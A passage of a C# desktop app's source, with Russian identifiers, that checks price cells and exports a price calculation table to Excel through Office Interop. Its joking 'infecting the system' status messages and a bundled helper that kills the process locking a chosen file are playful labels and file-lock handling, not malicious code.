                    string цена = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentRow.Index].Cells[5].Value.ToString();
                    цена = цена.Replace(".", ",");
                    decimal newDecimal;
                    bool isDecimal = Decimal.TryParse(цена, out newDecimal);
                    dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentRow.Index].Cells[5].Value = newDecimal.ToString("########.0000");
                    string цена_получилось = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentRow.Index].Cells[5].Value.ToString();
                    if (цена_получилось == ",0000") { dataGridView_расчёт_2[5, dataGridView_расчёт_2.CurrentRow.Index].Style.BackColor = Color.FromArgb(255, 255, 20, 20); ohibki = true; }
                }
                //  dataGridView_Заказ[w, q].Style.BackColor = Color.FromArgb(255, 255, 255, 255);
                if (ohibki == true) { label_consol_2.Text = "Исправте ячейки выделенные красным, и попробуйте снова"; }
                if (ohibki == false)
                {
                    // проеряем число цены!
                    bindingNavigatorAddNewItem.Visible = true;
                    bindingNavigatorAddNewItem.PerformClick(); // добавить строку в таблице базы
                    bindingNavigatorAddNewItem.Visible = false;
                    производительTextBox.Text = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentRow.Index].Cells[1].Value.ToString();
                    наименованиеTextBox.Text = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentRow.Index].Cells[2].Value.ToString();
                    артикулTextBox.Text = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentRow.Index].Cells[3].Value.ToString();
                    ценаTextBox.Text = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentRow.Index].Cells[5].Value.ToString();
                    if (dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentRow.Index].Cells[4].Value != null) фотографияPictureBox.Image = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentRow.Index].Cells[4].Value as Bitmap;
                    //возращаем назад расчетку с "00" вместо "0000"
                    string цена_получилось2 = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentRow.Index].Cells[5].Value.ToString();
                    цена_получилось2 = цена_получилось2.Remove(цена_получилось2.Length - 2);
                    dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentRow.Index].Cells[5].Value = цена_получилось2;
                    tableDataGridView.CurrentCell = tableDataGridView.Rows[tableDataGridView.RowCount - 1].Cells[2];
                    label_consol.Text = "Добавлена новая позиция в прайс. Порядковый номер:" + tableDataGridView[0, this.tableBindingSource.Count - 1].Value.ToString();
                    tableDataGridView.CurrentCell = tableDataGridView.Rows[tableDataGridView.RowCount - 2].Cells[2];
                    label_consol_2.Text = "Перенесена выделенная строка в расчетки в конец базы, Не забывай проверить: Нет ли копий выше в базе.";
                }
            }
            if (dod == true) { Baza = true; button_Baza_RACHET.Text = "РАСЧЁТ > ПРАЙС"; groupBox_baza.Visible = false; groupBox_razhet.Visible = true; }
        }
        int xaxa1 = 0;
        //сохранение без фото в новый excel 
        private void сохранение_без_фото_в_excel()
        {
            //цвета полей.
            string[] color = new string[15];
            int r = 0;
            using (StreamReader stream = new StreamReader("rez\\Color_excel.txt"))
            {
                while (stream.Peek() >= 0)
                {
                    color[r] = stream.ReadLine();
                    r++;
                }
                stream.Close();
            }

            label_consol_2.Text = "Юзер решил вывести расчетку в Ексельку без фоточек?";
            SaveFileDialog saveFileDialog1 = new SaveFileDialog(); //создание диалогового окна для выбора файла
            if (setting[20] != null && setting[20] != "") saveFileDialog1.InitialDirectory = setting[20];
            saveFileDialog1.Filter = "Таблица excel(.xlsx)|*.xlsx"; //формат загружаемого файла
            try
            {
                if (saveFileDialog1.ShowDialog() == DialogResult.Cancel)
                    return;
                // получаем выбранный файл
                string filename = saveFileDialog1.FileName;


                dialog_mess("Start");
                label_consol_2.Text = "Загружаю Excel на компьютере...";
                dialog_mess("Загружаю Excel");
                Excel._Application m_app = null;
                // Книга Excel.
                Excel.Workbook m_workBook = null;
                // Страница Excel.
                dialog_mess("Захватываю управление\nзаражаю");
                Excel.Worksheet m_workSheet = null;
                //Диапазон ячеек
                Excel.Range rg = null;

                try
                {
                    label_consol_2.Text = "Создаю в Еxcel новый фаил...";
                    // Создание приложения Excel.
                    dialog_mess("разметка");
                    m_app = new Excel.Application();

                    // Приложение "невидимо". // m_app.Visible = false;
                    m_app.Visible = false;
                    // Приложение управляется пользователем.
                    m_app.UserControl = true;

                    // Добавление книги Excel.
                    // m_workBook = m_app.Workbooks.Add(Excel.XlWBATemplate.xlWBATWorksheet);
                    // Открытие файла Excel.
                    string put_k_programme = Environment.CurrentDirectory;
                    dialog_mess("Загружаю данные с шаблона");
                    m_workBook = m_app.Workbooks.Open(put_k_programme + "\\rez\\шаблон1.xlsx", Type.Missing, Type.Missing,
                         Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing,
                         Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing);
                    // Связь со страницей Excel.
                    m_workSheet = m_app.ActiveSheet as Excel.Worksheet;

                    #region Вставка картинок


                    for (int x = 2; x < dataGridView_расчёт_2.RowCount + 1; x++)
                    {
                        dialog_mess("Разметка: " + x.ToString() + "/" + (dataGridView_расчёт_2.RowCount + 1).ToString());
                        rg = m_workSheet.get_Range("E" + x, "E" + x); //rg = m_workSheet.get_Range("E" + 1, "E" + 1);
                        int v = 0;
                        try { string fdf = dataGridView_расчёт_2.Rows[x - 2].Cells[1].Value.ToString(); v = fdf.Length / 2; } catch { }
                        try { string fdf1 = dataGridView_расчёт_2.Rows[x - 2].Cells[2].Value.ToString(); if (fdf1.Length / 2 > v) { v = fdf1.Length / 2; } } catch { }
                        try { string fdf2 = dataGridView_расчёт_2.Rows[x - 2].Cells[3].Value.ToString(); if (fdf2.Length / 2 > v) { v = fdf2.Length / 2; } } catch { }
                        if (rg.RowHeight < v) { rg.RowHeight = v; } // -ЭТО ВЫСОТА СТРОК                    

                    }
                    try { System.IO.File.Delete("rez\\temp.jpg"); } catch { }
                    #endregion
                    label_consol_2.Text = "Пихаю текст по ячейкам... ЖДИТЕ!!!!";
                    dialog_mess("Цвет заглавной строки");
                    for (int f = 1; f < 10; f++) { if (color[0] != "Transparent") (m_workSheet.Cells[1, f] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[0]); } // закрасим первую страку с надписями! 
                                                                                                                                                                                                 //переносим текст
                    for (int i = 1; i < dataGridView_расчёт_2.RowCount + 1; i++)
                    {
                        dialog_mess("Заполнение текста.стр:" + i.ToString() + "/" + (dataGridView_расчёт_2.RowCount + 1).ToString());
                        if (dataGridView_расчёт_2.Rows[i - 1].Cells[5].Value == null && dataGridView_расчёт_2.Rows[i - 1].Cells[6].Value == null && dataGridView_расчёт_2.Rows[i - 1].Cells[7].Value == null)
                        {   // это название графы

                            Excel.Range _excelCells1 = (Excel.Range)m_workSheet.get_Range("A" + (i + 1).ToString(), "E" + (i + 1).ToString()).Cells;
                            _excelCells1.Merge(Type.Missing);
                            string a1, a2, a3;
                            try { a1 = dataGridView_расчёт_2.Rows[i - 1].Cells[1].Value.ToString(); } catch { a1 = ""; }
                            try { a2 = dataGridView_расчёт_2.Rows[i - 1].Cells[2].Value.ToString(); } catch { a2 = " "; }
                            try { a3 = dataGridView_расчёт_2.Rows[i - 1].Cells[3].Value.ToString(); } catch { a3 = " "; }
                            m_workSheet.Rows[i + 1].Columns[1] = a1 + a2 + a3;
                            if (color[1] != "Transparent")
                            {
                                (m_workSheet.Cells[i + 1, 1] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[1]);
                                (m_workSheet.Cells[i + 1, 6] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[1]);
                                (m_workSheet.Cells[i + 1, 7] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[1]);
                                (m_workSheet.Cells[i + 1, 8] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[1]);
                                (m_workSheet.Cells[i + 1, 9] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[1]);
                            } // закрасим
                            m_workSheet.Rows[i + 1].Columns[1].HorizontalAlignment = Excel.XlHAlign.xlHAlignLeft;

                            //   добавляем линии в обедененной ячейке
                            m_workSheet.Rows[i + 1].Columns[9].Borders(XlBordersIndex.xlEdgeRight).LineStyle = 1;
                            m_workSheet.Rows[i + 1].Columns[1].Borders(XlBordersIndex.xlEdgeLeft).LineStyle = 1;
                            m_workSheet.Rows[i + 1].Columns[9].Borders(XlBordersIndex.xlEdgeRight).Weight = XlBorderWeight.xlThick;
                            m_workSheet.Rows[i + 1].Columns[1].Borders(XlBordersIndex.xlEdgeLeft).Weight = XlBorderWeight.xlThick;

                        }
                        else
                        {
                            for (int j = 1; j < dataGridView_расчёт_2.ColumnCount + 1; j++)
                            {
                                if (j != 5 && j != 9 && j != 10 && j != 11)
                                {
                                    if (j == 2 || j == 3 || j == 4 || j == 6 || j == 7 || j == 8) { if (color[2] != "Transparent") (m_workSheet.Cells[i + 1, j] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[2]); }

                                    if (j == 1)
                                    {
                                        if (color[2] != "Transparent")
                                        {
                                            (m_workSheet.Cells[i + 1, j] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[2]);
                                        }
                                    }


                                    if ((j == 6 || j == 8))  //2022/02/07 заметил АВ, что цены в виде текста
                                    {
                                        if (j == 8)
                                        {
                                            if (i < dataGridView_расчёт_2.RowCount)
                                                m_workSheet.Rows[i + 1].Columns[j] = Convert.ToDouble(dataGridView_расчёт_2.Rows[i - 1].Cells[j - 1].Value);
                                            if (i == dataGridView_расчёт_2.RowCount && j == 8)
                                                m_workSheet.Rows[i + 1].Columns[j] = Convert.ToDouble(dataGridView_расчёт_2.Rows[i - 1].Cells[j - 1].Value);
                                        }
                                        if (j == 6)
                                        {

                                            if (i < dataGridView_расчёт_2.RowCount)
                                                m_workSheet.Rows[i + 1].Columns[7] = Convert.ToDouble(dataGridView_расчёт_2.Rows[i - 1].Cells[j - 1].Value);
                                        }
                                    }
                                    else
                                    {
                                        if (j != 7)
                                        {
                                            m_workSheet.Rows[i + 1].Columns[j] = dataGridView_расчёт_2.Rows[i - 1].Cells[j - 1].Value;
                                        }
                                        else
                                        {
                                            m_workSheet.Rows[i + 1].Columns[6] = dataGridView_расчёт_2.Rows[i - 1].Cells[j - 1].Value;
                                        }
                                    }
                                }
                                if (j == 11)
                                {
                                    if (color[4] != "Transparent") { (m_workSheet.Cells[i + 1, j - 2] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[4]); }
                                    m_workSheet.Rows[i + 1].Columns[j - 2] = dataGridView_расчёт_2.Rows[i - 1].Cells[j - 1].Value;
                                }
                                if (j == 5 && color[3] != "Transparent")
                                {
                                    (m_workSheet.Cells[i + 1, j] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[3]);
                                }
                            }
                        }

                        if (dataGridView_расчёт_2.RowCount == i) //перенос итого
                        {
                            try
                            {
                                string k = dataGridView_расчёт_2.Rows[i - 1].Cells[6].Value.ToString();
                                if (k == "Итого без НДС:")
                                {

                                    m_workSheet.Rows[i + 1].Columns[3] = color[10];
                                    m_workSheet.Rows[i + 1].Columns[6] = null;
                                    if (color[10] == "Итого:")
                                    {
                                        m_workSheet.Rows[1].Columns[7] = "Цена";
                                        m_workSheet.Rows[1].Columns[8] = "Общая сумма";
                                    }
                                    if (color[10] == "Итого с НДС:")
                                    {
                                        m_workSheet.Rows[1].Columns[7] = "Цена с НДС";
                                        m_workSheet.Rows[1].Columns[8] = "Сумма с НДС";
                                    }
                                    if (color[10] == "Цена:")
                                    {
                                        m_workSheet.Rows[1].Columns[7] = "Цена";
                                        m_workSheet.Rows[1].Columns[8] = "Сумма";
                                    }
                                }
                            }
                            catch { }
                        }

                    }


                    if (textBox_P_S.Text != null && textBox_P_S.Text != "")
                    {
                        dialog_mess("Перенос ps.");
                        m_workSheet.Rows[dataGridView_расчёт_2.RowCount + 2].Columns[1] = textBox_P_S.Text;
                        if (color[5] != "Transparent")
                        {
                            (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 1] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                            (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 2] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                            (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 3] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                            (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 4] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                            (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 5] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                            (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 6] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                            (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 7] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                            (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 8] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                            (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 9] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                        }
                    }

                    //дописываем коэф для менеджера.
                    if (comboBox_елупни.SelectedItem.ToString() != "" && была_нажата_расёт_и_цена_или_просто_расёт == true)   // && color[9] == "1")   - если через настройки замени этим
                    {
                        dialog_mess("Перенос имя манагера.");
                        m_workSheet.Rows[dataGridView_расчёт_2.RowCount + 3].Columns[7] = "Цена для:";
                        m_workSheet.Rows[dataGridView_расчёт_2.RowCount + 3].Columns[8] = comboBox_елупни.SelectedItem.ToString();
                    }

                    m_workSheet.Columns[5].Delete();


                    //  m_workSheet.Cells[20, 1].RowHeight = 50;  //60 символов в 1 строке
                    //читаем и помещаем файл в add
                    System.IO.FileInfo obj = new System.IO.FileInfo(filename); // получаем имя
                                                                               // ActiveForm.Text = obj.Name;
                    char[] MyChar = { '.', 'x', 'l', 's', 'x' };
                    string Directory1 = filename.TrimEnd(MyChar); // путь к папке                                                           
                                                                  //меняем имя 1го листа:
                    m_workBook.Sheets[1].Name = obj.Name.TrimEnd(MyChar);// имя файла без пути! 
                }
                finally
                {
                    label_consol_2.Text = "Сохраняю данные в новом файле...";
                    dialog_mess("Cохранение excel");
                    m_workBook.SaveCopyAs(filename);
                    m_workBook.Close(false, "", null);
                    dialog_mess("Закрытие excel\nУбивить в озу");
                    try { m_app.Quit(); } catch { }
                    m_workBook = null;
                    m_workSheet = null;
                    rg = null;
                    m_app = null;

                    GC.Collect();
                    label_consol_2.Text = "Файл удачно сохранен. И лежит в: " + filename.ToString();
                }
            }
            catch
            {
                label_consol_2.Text = "У тебя крякнутый не полноценный Excel, кажись я не смогла закрыть файл.";
            }
            dialog_mess("Stop");

            this.Text = "Прайс Дахмиры        источник:" + istohtik_bazi;



        }    
        //сохранение без фото другим листом
        private void сохранение_листом_в_excel()
        {
            //цвета полей.
            string[] color = new string[15];
            int r = 0;
            using (StreamReader stream = new StreamReader("rez\\Color_excel.txt"))
            {
                while (stream.Peek() >= 0)
                {
                    color[r] = stream.ReadLine();
                    r++;
                }
                stream.Close();
            }
            label_consol_2.Text = "Юзер решил пихануть в другой файл Ексельки?";
            OpenFileDialog saveFileDialog1 = new OpenFileDialog(); //создание диалогового окна для выбора файла
           if (setting[20]!=null&& setting[20] != "") saveFileDialog1.InitialDirectory = setting[20];

            saveFileDialog1.Filter = "Таблица excel(.xlsx)|*.xlsx"; //формат загружаемого файла
            try
            {
                while (true)
                {
                    if (saveFileDialog1.ShowDialog() == DialogResult.Cancel) return;
                    try
                    {
                        using (var fs = File.Open(saveFileDialog1.FileName, FileMode.Open, FileAccess.Read, FileShare.None))
                        {
                            break;
                        }
                    }
                    catch (IOException ioex)
                    {
                        DialogResult butRez = MessageBox.Show("Этот файл занят другой программой!\n  Выбери другой, или отключи программу.", "Неполучается так.", MessageBoxButtons.AbortRetryIgnore);
                        if (butRez == DialogResult.Abort) { return; }
                        if (butRez == DialogResult.Retry) { }
                        if (butRez == DialogResult.Ignore)
                        {
                            //убиваем процесс в оперативке
                            //закрыть логотип (убить! )
                            try
                            {
                                dialog_mess("Start");
                                Process tool = new Process();
                                tool.StartInfo.FileName = "rez\\Melissa.exe";
                                tool.StartInfo.Arguments = saveFileDialog1.FileName + " /accepteula";
                                tool.StartInfo.UseShellExecute = false;
                                tool.StartInfo.RedirectStandardOutput = true;
                                tool.Start();
                                dialog_mess("Заражаю систему");
                                tool.WaitForExit();
                                string outputTool = tool.StandardOutput.ReadToEnd();
                                string matchPattern = @"(?<=\s+pid:\s+)\b(\d+)\b(?=\s+)";
                                dialog_mess("Убиваю программу захватчика!");
                                foreach (Match match in Regex.Matches(outputTool, matchPattern))
                                {
                                    Process.GetProcessById(int.Parse(match.Value)).Kill();
                                }
                                break;
                            }
                            catch
                            {
                            }
                        }
                        //прервать повтор пропустить 
                    }
                }
                //Имя листа 
                dialog_mess("Start");

                dialog_mess("Жду отмашки от юзира");     
                string listname = Microsoft.VisualBasic.Interaction.InputBox("Введите имя нового листа! \n\nБудет выполнена проверка в файле.\nЕсли такое имя есть, то новый лист\nбудет пронумерован с тем же именем, но с приставкой (2)...(х)\n\n\n", "Окно ввода имени новому листу.", "");
                if (listname == "") { return; }
                // получаем выбранный файл
                string filename = saveFileDialog1.FileName;
                label_consol_2.Text = "Загружаю Excel на компьютере...";
                dialog_mess("Загружаю Excel");
                Excel._Application m_app = null;
                // Книга Excel.
                dialog_mess("Захватываю управление\nзаражаю");
                Excel.Workbook m_workBook = null;
                // Страница Excel.
                Excel.Worksheet m_workSheet = null;

                //Диапазон ячеек
                Excel.Range rg = null;
                try
                {
                    label_consol_2.Text = "Создаю в Еxcel новый фаил...";
                    // Создание приложения Excel.
                    dialog_mess("разметка");
                    m_app = new Excel.Application();

                    // Приложение "невидимо". // m_app.Visible = false;
                    m_app.Visible = false;
                    // Приложение управляется пользователем.
                    m_app.UserControl = true;

                    // Добавление книги Excel.
                    // m_workBook = m_app.Workbooks.Add(Excel.XlWBATemplate.xlWBATWorksheet);
                    // Открытие файла Excel.
                    string put_k_programme = Environment.CurrentDirectory;
                    dialog_mess("Загружаю данные с шаблона");
                    m_workBook = m_app.Workbooks.Open(put_k_programme + "\\rez\\шаблон1.xlsx", Type.Missing, Type.Missing,
                         Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing,
                         Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing);
                    // Связь со страницей Excel.
                    m_workSheet = m_app.ActiveSheet as Excel.Worksheet;

                    #region Вставка картинок


                    for (int x = 2; x < dataGridView_расчёт_2.RowCount + 1; x++)
                    {
                        dialog_mess("Разметка: " + x.ToString() + "/" + (dataGridView_расчёт_2.RowCount + 1).ToString());
                        rg = m_workSheet.get_Range("E" + x, "E" + x); //rg = m_workSheet.get_Range("E" + 1, "E" + 1);

                        int v = 0;
                        try { string fdf = dataGridView_расчёт_2.Rows[x - 2].Cells[1].Value.ToString(); v = fdf.Length / 2; } catch { }
                        try { string fdf1 = dataGridView_расчёт_2.Rows[x - 2].Cells[2].Value.ToString(); if (fdf1.Length / 2 > v) { v = fdf1.Length / 2; } } catch { }
                        try { string fdf2 = dataGridView_расчёт_2.Rows[x - 2].Cells[3].Value.ToString(); if (fdf2.Length / 2 > v) { v = fdf2.Length / 2; } } catch { }
                        if (rg.RowHeight < v) { rg.RowHeight = v; } // -ЭТО ВЫСОТА СТРОК                    
                    }
                    try { System.IO.File.Delete("rez\\temp.jpg"); } catch { }
                    #endregion
                    label_consol_2.Text = "Пихаю текст по ячейкам... ЖДИТЕ!!!!";
                    dialog_mess("Цвет заглавной строки");
                    for (int f = 1; f < 10; f++) { if (color[0] != "Transparent") (m_workSheet.Cells[1, f] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[0]); } // закрасим первую страку с надписями! 
                    //переносим текст
                    for (int i = 1; i < dataGridView_расчёт_2.RowCount + 1; i++)
                    {
                        dialog_mess("Заполнение текста.стр:" + i.ToString() + "/" + (dataGridView_расчёт_2.RowCount + 1).ToString());
                        if (dataGridView_расчёт_2.Rows[i - 1].Cells[5].Value == null && dataGridView_расчёт_2.Rows[i - 1].Cells[6].Value == null && dataGridView_расчёт_2.Rows[i - 1].Cells[7].Value == null)
                        {   // это название графы

                            Excel.Range _excelCells1 = (Excel.Range)m_workSheet.get_Range("A" + (i + 1).ToString(), "E" + (i + 1).ToString()).Cells;
                            _excelCells1.Merge(Type.Missing);
                            string a1, a2, a3;
                            try { a1 = dataGridView_расчёт_2.Rows[i - 1].Cells[1].Value.ToString(); } catch { a1 = ""; }
                            try { a2 = dataGridView_расчёт_2.Rows[i - 1].Cells[2].Value.ToString(); } catch { a2 = " "; }
                            try { a3 = dataGridView_расчёт_2.Rows[i - 1].Cells[3].Value.ToString(); } catch { a3 = " "; }
                            m_workSheet.Rows[i + 1].Columns[1] = a1 + a2 + a3;
                            if (color[1] != "Transparent")
                            {
                                (m_workSheet.Cells[i + 1, 1] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[1]);
                                (m_workSheet.Cells[i + 1, 6] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[1]);
                                (m_workSheet.Cells[i + 1, 7] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[1]);
                                (m_workSheet.Cells[i + 1, 8] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[1]);
                                (m_workSheet.Cells[i + 1, 9] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[1]);
                            } // закрасим
                            m_workSheet.Rows[i + 1].Columns[1].HorizontalAlignment = Excel.XlHAlign.xlHAlignLeft;

                            //   добавляем линии в обедененной ячейке
                            m_workSheet.Rows[i + 1].Columns[9].Borders(XlBordersIndex.xlEdgeRight).LineStyle = 1;
                            m_workSheet.Rows[i + 1].Columns[1].Borders(XlBordersIndex.xlEdgeLeft).LineStyle = 1;
                            m_workSheet.Rows[i + 1].Columns[9].Borders(XlBordersIndex.xlEdgeRight).Weight = XlBorderWeight.xlThick;
                            m_workSheet.Rows[i + 1].Columns[1].Borders(XlBordersIndex.xlEdgeLeft).Weight = XlBorderWeight.xlThick;
                        }
                        else
                        {
                            for (int j = 1; j < dataGridView_расчёт_2.ColumnCount + 1; j++)
                            {
                                if (j != 5 && j != 9 && j != 10 && j != 11)
                                {
                                    if (j == 2 || j == 3 || j == 4 || j == 6 || j == 7 || j == 8) { if (color[2] != "Transparent") (m_workSheet.Cells[i + 1, j] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[2]); }

                                    if (j == 1)
                                    {
                                        if (color[2] != "Transparent")
                                        {
                                            (m_workSheet.Cells[i + 1, j] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[2]);
                                        }
                                    }


                                    if ((j == 6 || j == 8))  //2022/02/07 заметил АВ, что цены в виде текста
                                    {
                                        if (j == 8)
                                        {
                                            if (i < dataGridView_расчёт_2.RowCount)
                                                m_workSheet.Rows[i + 1].Columns[j] = Convert.ToDouble(dataGridView_расчёт_2.Rows[i - 1].Cells[j - 1].Value);
                                            if (i == dataGridView_расчёт_2.RowCount && j == 8)
                                                m_workSheet.Rows[i + 1].Columns[j] = Convert.ToDouble(dataGridView_расчёт_2.Rows[i - 1].Cells[j - 1].Value);
                                        }
                                        if (j == 6)
                                        {

                                            if (i < dataGridView_расчёт_2.RowCount)
                                                m_workSheet.Rows[i + 1].Columns[7] = Convert.ToDouble(dataGridView_расчёт_2.Rows[i - 1].Cells[j - 1].Value);
                                        }
                                    }
                                    else
                                    {
                                        if (j != 7)
                                        {
                                            m_workSheet.Rows[i + 1].Columns[j] = dataGridView_расчёт_2.Rows[i - 1].Cells[j - 1].Value;
                                        }
                                        else
                                        {
                                            m_workSheet.Rows[i + 1].Columns[6] = dataGridView_расчёт_2.Rows[i - 1].Cells[j - 1].Value;
                                        }
                                    }
                                }
                                if (j == 11)
                                {
                                    if (color[4] != "Transparent") { (m_workSheet.Cells[i + 1, j - 2] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[4]); }
                                    m_workSheet.Rows[i + 1].Columns[j - 2] = dataGridView_расчёт_2.Rows[i - 1].Cells[j - 1].Value;
                                }
                                if (j == 5 && color[3] != "Transparent")
                                {
                                    (m_workSheet.Cells[i + 1, j] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[3]);
                                }
                            }
                        }
                        if (dataGridView_расчёт_2.RowCount == i) //перенос итого
                        {
                            try
                            {
                                string k = dataGridView_расчёт_2.Rows[i - 1].Cells[6].Value.ToString();
                                if (k == "Итого без НДС:")
                                {
                                    m_workSheet.Rows[i + 1].Columns[3] = color[10];
                                    m_workSheet.Rows[i + 1].Columns[6] = null;
                                    if (color[10] == "Итого:")
                                    {
                                        m_workSheet.Rows[1].Columns[7] = "Цена";
                                        m_workSheet.Rows[1].Columns[8] = "Общая сумма";
                                    }
                                    if (color[10] == "Итого с НДС:")
                                    {
                                        m_workSheet.Rows[1].Columns[7] = "Цена с НДС";
                                        m_workSheet.Rows[1].Columns[8] = "Сумма с НДС";
                                    }
                                    if (color[10] == "Цена:")
                                    {
                                        m_workSheet.Rows[1].Columns[7] = "Цена";
                                        m_workSheet.Rows[1].Columns[8] = "Сумма";
                                    }
                                }
                            }
                            catch { }
                        }
                    }

                    if (textBox_P_S.Text != null && textBox_P_S.Text != "")
                    {
                        dialog_mess("Перенос ps.");
                        m_workSheet.Rows[dataGridView_расчёт_2.RowCount + 2].Columns[1] = textBox_P_S.Text;
                        if (color[5] != "Transparent")
                        {
                            (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 1] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                            (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 2] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                            (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 3] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                            (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 4] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                            (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 5] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                            (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 6] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                            (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 7] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                            (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 8] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                            (m_workSheet.Cells[dataGridView_расчёт_2.RowCount + 2, 9] as Microsoft.Office.Interop.Excel.Range).Interior.Color = Color.FromName(color[5]);
                        }
                    }

                    //дописываем коэф для менеджера.
                    if (comboBox_елупни.SelectedItem.ToString() != "" && была_нажата_расёт_и_цена_или_просто_расёт == true)   // && color[9] == "1")   - если через настройки замени этим
                    {
                        dialog_mess("Перенос имя манагера.");
                        m_workSheet.Rows[dataGridView_расчёт_2.RowCount + 3].Columns[7] = "Цена для:";
                        m_workSheet.Rows[dataGridView_расчёт_2.RowCount + 3].Columns[8] = comboBox_елупни.SelectedItem.ToString();
                    }
                    m_workSheet.Columns[5].Delete();
                    //меняем имя 1го листа:                      
                    m_workBook.Sheets[1].Name = listname;
                }
                finally
                {
                    label_consol_2.Text = "Сохраняю данные в левом файле...";
                    dialog_mess("Дополняю лист в существующий файл");
                    Excel.Workbook xlWB2; //рабочая книга куда будем копировать лист
                    xlWB2 = m_app.Workbooks.Open(filename); //название файла Excel куда будем копировать лист
                    Excel.Worksheet xlSht; //лист Excel 
                    xlSht = m_workBook.Worksheets[1];
                    xlSht.Copy(After: xlWB2.Worksheets[xlWB2.Worksheets.Count]);  //сам процесс копирования листа из одного файла в другой  
                    xlWB2.Close(true);
                    // m_workBook.SaveCopyAs(filename); нихуя не сохраняем 
                    m_workBook.Close(false, "", null);
                    // Закрытие приложения Excel.
                    dialog_mess("Закрытие excel\nУбивить в озу");
                    try { m_app.Quit(); } catch { }
                    m_workBook = null;
                    m_workSheet = null;
                    rg = null;
                    m_app = null;
                    xlSht = null;
                    xlWB2 = null;
                    GC.Collect();
                    label_consol_2.Text = "Файл удачно дополнен. И лежит в: " + filename.ToString();
                }
            }
            catch
            {
                label_consol_2.Text = "У тебя крякнутый не полноценный Excel, кажись я не смогла закрыть файл.";
            }
            dialog_mess("Stop");

            this.Text = "Прайс Дахмиры        источник:" + istohtik_bazi;

        }
        //сохранение с фото в новый excel 
        private void button_new_ophins_Click(object sender, EventArgs e)
        {
            if (dataGridView_расчёт_2.CurrentRow == null)
            {
